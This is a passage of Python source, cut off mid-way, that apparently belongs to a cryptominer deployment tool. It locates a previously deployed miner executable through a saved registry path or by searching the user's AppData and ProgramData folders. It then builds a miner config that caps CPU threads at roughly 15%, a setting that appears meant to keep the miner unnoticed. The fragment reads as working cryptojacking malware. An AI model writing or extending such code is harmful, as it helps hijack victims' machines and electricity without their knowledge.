def find_miner_exe():
    saved_path = _get_deployed_miner_path()
    if saved_path:
        hawk.info(f"[FIND_MINER] found via registry: {saved_path}")
        return saved_path

    hawk.info("[FIND_MINER] searching for miner executable")
    search_roots = [
        os.environ.get('LOCALAPPDATA', ''),
        os.environ.get('APPDATA', ''),
        os.environ.get('ProgramData', '')
    ]
    for root in search_roots:
        if not root:
            continue
        for dirpath, dirnames, filenames in os.walk(root):
            depth = dirpath.replace(root, '').count(os.sep)
            if depth > 4:
                dirnames.clear()
            for f in filenames:
                if f.lower() == f"{EXE_NAME.lower()}.exe":
                    full_path = os.path.join(dirpath, f)
                    if 'temp' in full_path.lower():
                        continue
                    hawk.info(f"[FIND_MINER] found: {full_path}")
                    return full_path
    hawk.error("[FIND_MINER] miner exe not found")
    return None

def generate_config(config_dir, threads=None):
    hawk.info("[CONFIG] generating config.json")
    if threads is None:
        cpu_count = os.cpu_count() or 4
        threads = max(1, round(cpu_count * 0.15))
    hawk.debug(f"[CONFIG] using {threads} threads")
    config = {
        "autosave": True,
        "cpu": {
            "enabled": True,
